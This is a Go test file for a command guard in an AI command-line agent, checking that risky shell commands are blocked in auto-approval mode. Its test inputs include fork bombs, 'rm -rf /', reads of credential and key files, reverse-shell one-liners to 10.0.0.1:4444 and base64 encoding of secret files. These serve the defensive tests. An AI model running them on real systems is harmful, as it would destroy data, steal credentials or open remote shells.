package runtime

import (
	"strings"
	"testing"

	internalconfig "snz1.cn/gitrepo/dp/ai/taiyi/taiyiflow-cli/internal/config"
)

// TestGuardDangerousCommandForkBombBashClassic verifies that the classic bash
// fork bomb pattern ":(){ :|:& };:" is blocked in auto approval mode.
func TestGuardDangerousCommandForkBombBashClassic(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: ":(){ :|:& };:",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected fork bomb to be blocked, but got nil error")
	}
	if !strings.Contains(err.Error(), "高风险命令") {
		t.Fatalf("expected high-risk error, got: %v", err)
	}
}

// TestGuardDangerousCommandForkBombBashVariant verifies that a variant with
// spaces like ": () { : | : & } ; :" is also blocked via the ":|:&" fragment.
func TestGuardDangerousCommandForkBombBashVariant(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: ": () { : | : & } ; :",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected fork bomb variant to be blocked, but got nil error")
	}
}

// TestGuardDangerousCommandForkBombPerl verifies that the perl fork bomb
// "perl -e 'fork while fork'" is blocked.
func TestGuardDangerousCommandForkBombPerl(t *testing.T) {
	payload := commandArguments{
		Mode:    "shell",
		Command: "perl",
		Args:    []string{"-e", "fork while fork"},
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected perl fork bomb to be blocked, but got nil error")
	}
}

// TestGuardDangerousCommandForkBombPythonOsFork verifies that python fork
// bomb using os.fork() is blocked.
func TestGuardDangerousCommandForkBombPythonOsFork(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "python3 -c 'import os; os.fork()'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected python os.fork() to be blocked, but got nil error")
	}
}

// TestGuardDangerousCommandForkBombPythonWhileLoop verifies that python fork
// bomb with explicit while loop is blocked.
func TestGuardDangerousCommandForkBombPythonWhileLoop(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "python3 -c 'import os; while True: os.fork()'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected python while-loop fork bomb to be blocked, but got nil error")
	}
}

// TestGuardDangerousCommandForkBombAllowedInNonAutoMode verifies that fork
// bomb patterns are not blocked when approval mode is not "auto".
func TestGuardDangerousCommandForkBombAllowedInNonAutoMode(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: ":(){ :|:& };:",
	}
	cfg := internalconfig.Config{ApprovalMode: "readonly"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected no error in non-auto mode, got: %v", err)
	}
}

// TestGuardDangerousCommandExistingHighRisk verifies that existing high-risk
// patterns (rm -rf /) are still blocked.
func TestGuardDangerousCommandExistingHighRisk(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "rm -rf /",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected rm -rf / to be blocked, but got nil error")
	}
}

// TestGuardDangerousCommandSafeCommand verifies that safe commands are not blocked.
func TestGuardDangerousCommandSafeCommand(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "echo hello",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected safe command to pass, got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// 敏感文件访问拦截测试
// ---------------------------------------------------------------------------

// TestGuardSensitiveFileAccessEtcPasswd verifies that reading /etc/passwd
// via cat is blocked in auto approval mode.
func TestGuardSensitiveFileAccessEtcPasswd(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat /etc/passwd",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected /etc/passwd access to be blocked, but got nil error")
	}
	if !strings.Contains(err.Error(), "敏感文件") {
		t.Fatalf("expected sensitive file error, got: %v", err)
	}
}

// TestGuardSensitiveFileAccessEtcShadow verifies that reading /etc/shadow
// via head is blocked.
func TestGuardSensitiveFileAccessEtcShadow(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "head -20 /etc/shadow",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected /etc/shadow access to be blocked")
	}
}

// TestGuardSensitiveFileAccessSSHKey verifies that reading SSH private keys
// is blocked.
func TestGuardSensitiveFileAccessSSHKey(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat ~/.ssh/id_rsa",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected SSH key access to be blocked")
	}
}

// TestGuardSensitiveFileAccessAWSCredentials verifies that reading AWS
// credentials is blocked.
func TestGuardSensitiveFileAccessAWSCredentials(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat ~/.aws/credentials",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected AWS credentials access to be blocked")
	}
}

// TestGuardSensitiveFileAccessKubeConfig verifies that reading Kubernetes
// config is blocked.
func TestGuardSensitiveFileAccessKubeConfig(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat ~/.kube/config",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected kube config access to be blocked")
	}
}

// TestGuardSensitiveFileAccessDockerConfig verifies that reading Docker
// config is blocked.
func TestGuardSensitiveFileAccessDockerConfig(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat ~/.docker/config.json",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected Docker config access to be blocked")
	}
}

// TestGuardSensitiveFileAccessNetrc verifies that reading .netrc is blocked.
func TestGuardSensitiveFileAccessNetrc(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat ~/.netrc",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected .netrc access to be blocked")
	}
}

// TestGuardSensitiveFileAccessGitCredentials verifies that reading
// .git-credentials is blocked.
func TestGuardSensitiveFileAccessGitCredentials(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat ~/.git-credentials",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected .git-credentials access to be blocked")
	}
}

// TestGuardSensitiveFileAccessNpmrc verifies that reading .npmrc is blocked.
func TestGuardSensitiveFileAccessNpmrc(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat ~/.npmrc",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected .npmrc access to be blocked")
	}
}

// TestGuardSensitiveFileAccessPypirc verifies that reading .pypirc is blocked.
func TestGuardSensitiveFileAccessPypirc(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat ~/.pypirc",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected .pypirc access to be blocked")
	}
}

// TestGuardSensitiveFileAccessGnupg verifies that reading .gnupg is blocked.
func TestGuardSensitiveFileAccessGnupg(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "ls ~/.gnupg/",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected .gnupg access to be blocked")
	}
}

// TestGuardSensitiveFileAccessXxd verifies that using xxd to read a sensitive
// file is blocked.
func TestGuardSensitiveFileAccessXxd(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "xxd /etc/passwd",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected xxd /etc/passwd to be blocked")
	}
}

// TestGuardSensitiveFileAccessCp verifies that copying a sensitive file
// is blocked.
func TestGuardSensitiveFileAccessCp(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cp /etc/passwd /tmp/leaked",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected cp /etc/passwd to be blocked")
	}
}

// TestGuardSensitiveFileAccessAllowedInNonAutoMode verifies that sensitive
// file access is not blocked when approval mode is not "auto".
func TestGuardSensitiveFileAccessAllowedInNonAutoMode(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat /etc/passwd",
	}
	cfg := internalconfig.Config{ApprovalMode: "readonly"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected no error in non-auto mode, got: %v", err)
	}
}

// TestGuardSensitiveFileAccessSafeFile verifies that reading a non-sensitive
// file is not blocked.
func TestGuardSensitiveFileAccessSafeFile(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat /tmp/hello.txt",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected safe file access to pass, got: %v", err)
	}
}

// TestGuardSensitiveFileAccessBase64 verifies that using base64 to read a
// sensitive file is blocked.
func TestGuardSensitiveFileAccessBase64(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "base64 /etc/shadow",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected base64 /etc/shadow to be blocked")
	}
}

// ---------------------------------------------------------------------------
// 反向 Shell 探测拦截测试
// ---------------------------------------------------------------------------

// TestGuardReverseShellBashDevTcp verifies that the classic bash /dev/tcp
// reverse shell is blocked.
func TestGuardReverseShellBashDevTcp(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected bash /dev/tcp reverse shell to be blocked")
	}
	if !strings.Contains(err.Error(), "反向 Shell") {
		t.Fatalf("expected reverse shell error, got: %v", err)
	}
}

// TestGuardReverseShellBashShI verifies that "sh -i >&" pattern is blocked.
func TestGuardReverseShellBashShI(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "sh -i >& /dev/tcp/10.0.0.1/4444 0>&1",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected sh -i reverse shell to be blocked")
	}
}

// TestGuardReverseShellNetCatE verifies that "nc -e" reverse shell is blocked.
func TestGuardReverseShellNetCatE(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "nc -e /bin/sh 10.0.0.1 4444",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected nc -e reverse shell to be blocked")
	}
}

// TestGuardReverseShellNcatE verifies that "ncat -e" reverse shell is blocked.
func TestGuardReverseShellNcatE(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "ncat -e /bin/bash 10.0.0.1 4444",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected ncat -e reverse shell to be blocked")
	}
}

// TestGuardReverseShellNcatC verifies that "ncat -c" reverse shell is blocked.
func TestGuardReverseShellNcatC(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "ncat -c /bin/bash 10.0.0.1 4444",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected ncat -c reverse shell to be blocked")
	}
}

// TestGuardReverseShellPythonSocket verifies that Python socket-based
// reverse shell is blocked.
func TestGuardReverseShellPythonSocket(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.0.0.1\",4444))'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected python socket reverse shell to be blocked")
	}
}

// TestGuardReverseShellPythonDup2 verifies that os.dup2 pattern is blocked.
func TestGuardReverseShellPythonDup2(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "python3 -c 'import os; os.dup2(2,0); os.dup2(2,1)'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected python os.dup2 reverse shell to be blocked")
	}
}

// TestGuardReverseShellPerlSocket verifies that Perl socket-based
// reverse shell is blocked.
func TestGuardReverseShellPerlSocket(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "perl -e 'use Socket; socket(S,PF_INET,SOCK_STREAM,0); connect(S,sockaddr_in(4444,inet_aton(\"10.0.0.1\")))'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected perl reverse shell to be blocked")
	}
}

// TestGuardReverseShellRubySocket verifies that Ruby socket-based
// reverse shell is blocked.
func TestGuardReverseShellRubySocket(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "ruby -rsocket -e 'TCPSocket.new(\"10.0.0.1\",\"4444\").puts \"hello\"",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected ruby reverse shell to be blocked")
	}
}

// TestGuardReverseShellPHPFsockopen verifies that PHP fsockopen-based
// reverse shell is blocked.
func TestGuardReverseShellPHPFsockopen(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "php -r '$sock=fsockopen(\"10.0.0.1\",4444); exec(\"/bin/sh -i <&3 >&3 2>&3\")'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected php fsockopen reverse shell to be blocked")
	}
}

// TestGuardReverseShellSocat verifies that socat-based reverse shell
// is blocked.
func TestGuardReverseShellSocat(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "socat tcp-connect:10.0.0.1:4444 exec:sh,pty",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected socat reverse shell to be blocked")
	}
}

// TestGuardReverseShellPowerShell verifies that PowerShell TCPClient-based
// reverse shell is blocked.
func TestGuardReverseShellPowerShell(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444)\"",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected powershell reverse shell to be blocked")
	}
}

// TestGuardReverseShellBashRedirection verifies that "0>&1" pattern alone
// is blocked (common in reverse shell payloads).
func TestGuardReverseShellBashRedirection(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected 0>&1 redirection to be blocked")
	}
}

// TestGuardReverseShellMkfifoNetcat verifies that mkfifo + nc combination
// is blocked.
func TestGuardReverseShellMkfifoNetcat(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected mkfifo+nc reverse shell to be blocked")
	}
}

// TestGuardReverseShellTelnet verifies that telnet-based reverse shell
// is blocked.
func TestGuardReverseShellTelnet(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "telnet 10.0.0.1 4444",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected telnet reverse shell to be blocked")
	}
}

// TestGuardReverseShellDevUdp verifies that /dev/udp pattern is blocked.
func TestGuardReverseShellDevUdp(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "bash -i >& /dev/udp/10.0.0.1/4444 0>&1",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected /dev/udp reverse shell to be blocked")
	}
}

// TestGuardReverseShellAllowedInNonAutoMode verifies that reverse shell
// patterns are not blocked when approval mode is not "auto".
func TestGuardReverseShellAllowedInNonAutoMode(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
	}
	cfg := internalconfig.Config{ApprovalMode: "readonly"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected no error in non-auto mode, got: %v", err)
	}
}

// TestGuardReverseShellSafeCommand verifies that safe network commands
// are not blocked.
func TestGuardReverseShellSafeCommand(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "curl https://example.com/api",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected safe curl command to pass, got: %v", err)
	}
}

// TestGuardReverseShellSocketCreate verifies that PHP socket_create pattern
// is blocked.
func TestGuardReverseShellSocketCreate(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "php -r 'socket_create(AF_INET, SOCK_STREAM, SOL_TCP)'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected php socket_create to be blocked")
	}
}

// ---------------------------------------------------------------------------
// 符号链接逃逸检测测试
// ---------------------------------------------------------------------------

// TestGuardSymlinkEscapeEtcPasswd verifies that creating a symlink to
// /etc/passwd is blocked.
func TestGuardSymlinkEscapeEtcPasswd(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "ln -s /etc/passwd /tmp/leaked_passwd",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected symlink to /etc/passwd to be blocked")
	}
	if !strings.Contains(err.Error(), "符号链接") {
		t.Fatalf("expected symlink escape error, got: %v", err)
	}
}

// TestGuardSymlinkEscapeSSHKey verifies that creating a symlink to SSH key
// is blocked.
func TestGuardSymlinkEscapeSSHKey(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "ln -s ~/.ssh/id_rsa /tmp/leaked_key",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected symlink to SSH key to be blocked")
	}
}

// TestGuardSymlinkEscapeForceFlag verifies that ln -sf to a sensitive path
// is blocked.
func TestGuardSymlinkEscapeForceFlag(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "ln -sf /etc/shadow /tmp/leaked_shadow",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected ln -sf to /etc/shadow to be blocked")
	}
}

// TestGuardSymlinkEscapeAWSCredentials verifies that creating a symlink to
// AWS credentials is blocked.
func TestGuardSymlinkEscapeAWSCredentials(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "ln -s ~/.aws/credentials /tmp/leaked_aws",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected symlink to AWS credentials to be blocked")
	}
}

// TestGuardSymlinkEscapeSafeLink verifies that creating a symlink to a
// non-sensitive path is not blocked.
func TestGuardSymlinkEscapeSafeLink(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "ln -s /tmp/source.txt /tmp/link.txt",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected safe symlink to pass, got: %v", err)
	}
}

// TestGuardSymlinkEscapeAllowedInNonAutoMode verifies that symlink escape
// is not blocked when approval mode is not "auto".
func TestGuardSymlinkEscapeAllowedInNonAutoMode(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "ln -s /etc/passwd /tmp/leaked",
	}
	cfg := internalconfig.Config{ApprovalMode: "readonly"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected no error in non-auto mode, got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// 脚本语言复制敏感文件检测测试
// ---------------------------------------------------------------------------

// TestGuardScriptSensitiveAccessPythonOpen verifies that using Python to
// open /etc/passwd is blocked.
func TestGuardScriptSensitiveAccessPythonOpen(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "python3 -c 'open(\"/etc/passwd\").read()'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected python open(/etc/passwd) to be blocked")
	}
	if !strings.Contains(err.Error(), "脚本语言") {
		t.Fatalf("expected script access error, got: %v", err)
	}
}

// TestGuardScriptSensitiveAccessPythonSSHKey verifies that using Python to
// read SSH key is blocked.
func TestGuardScriptSensitiveAccessPythonSSHKey(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "python3 -c 'open(\"~/.ssh/id_rsa\").read()'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected python open(~/.ssh/id_rsa) to be blocked")
	}
}

// TestGuardScriptSensitiveAccessPythonShutil verifies that using Python
// shutil.copy to copy sensitive file is blocked.
func TestGuardScriptSensitiveAccessPythonShutil(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "python3 -c 'import shutil; shutil.copy(\"/etc/passwd\", \"/tmp/leaked\")'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected python shutil.copy to be blocked")
	}
}

// TestGuardScriptSensitiveAccessPerlOpen verifies that using Perl to open
// /etc/shadow is blocked.
func TestGuardScriptSensitiveAccessPerlOpen(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "perl -e 'open(my $fh, \"<\", \"/etc/shadow\")'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected perl open(/etc/shadow) to be blocked")
	}
}

// TestGuardScriptSensitiveAccessRubyFileOpen verifies that using Ruby
// File.open to read sensitive file is blocked.
func TestGuardScriptSensitiveAccessRubyFileOpen(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "ruby -e 'File.open(\"/etc/passwd\").read'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected ruby File.open to be blocked")
	}
}

// TestGuardScriptSensitiveAccessNodeFs verifies that using Node.js fs
// to read sensitive file is blocked.
func TestGuardScriptSensitiveAccessNodeFs(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "node -e 'require(\"fs\").readFileSync(\"/etc/passwd\")'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected node fs.readFileSync to be blocked")
	}
}

// TestGuardScriptSensitiveAccessPHPFopen verifies that using PHP fopen
// to read sensitive file is blocked.
func TestGuardScriptSensitiveAccessPHPFopen(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "php -r 'fopen(\"/etc/shadow\", \"r\")'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected php fopen to be blocked")
	}
}

// TestGuardScriptSensitiveAccessSafeScript verifies that a safe Python
// script is not blocked.
func TestGuardScriptSensitiveAccessSafeScript(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "python3 -c 'print(\"hello world\")'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected safe python script to pass, got: %v", err)
	}
}

// TestGuardScriptSensitiveAccessSafeFileRead verifies that reading a
// non-sensitive file via Python is not blocked.
func TestGuardScriptSensitiveAccessSafeFileRead(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "python3 -c 'open(\"/tmp/hello.txt\").read()'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected safe file read to pass, got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// Base64 编码绕过防护测试
// ---------------------------------------------------------------------------

// TestGuardBase64BypassDirect verifies that base64 /etc/passwd is blocked.
func TestGuardBase64BypassDirect(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "base64 /etc/passwd",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected base64 /etc/passwd to be blocked")
	}
}

// TestGuardBase64BypassPipe verifies that cat /etc/passwd | base64 is blocked.
func TestGuardBase64BypassPipe(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat /etc/passwd | base64",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected cat /etc/passwd | base64 to be blocked")
	}
}

// TestGuardBase64BypassSSHKey verifies that base64 encoding of SSH key
// is blocked.
func TestGuardBase64BypassSSHKey(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "base64 ~/.ssh/id_rsa",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected base64 ~/.ssh/id_rsa to be blocked")
	}
}

// TestGuardBase64BypassXxd verifies that cat /etc/shadow | xxd is blocked.
func TestGuardBase64BypassXxd(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat /etc/shadow | xxd",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected cat /etc/shadow | xxd to be blocked")
	}
}

// TestGuardBase64BypassHexdump verifies that cat /etc/passwd | hexdump is blocked.
func TestGuardBase64BypassHexdump(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat /etc/passwd | hexdump -C",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected cat /etc/passwd | hexdump to be blocked")
	}
}

// TestGuardBase64BypassOpenssl verifies that openssl base64 encoding of
// sensitive file is blocked.
func TestGuardBase64BypassOpenssl(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat /etc/passwd | openssl base64",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected cat /etc/passwd | openssl base64 to be blocked")
	}
}

// TestGuardBase64BypassSafeFile verifies that base64 encoding of a
// non-sensitive file is not blocked.
func TestGuardBase64BypassSafeFile(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "base64 /tmp/hello.txt",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected safe base64 to pass, got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// 沙盒模式下下载外部文件拦截测试
// ---------------------------------------------------------------------------

// TestGuardNetworkDownloadCurl verifies that curl download is blocked
// when sandbox is enabled.
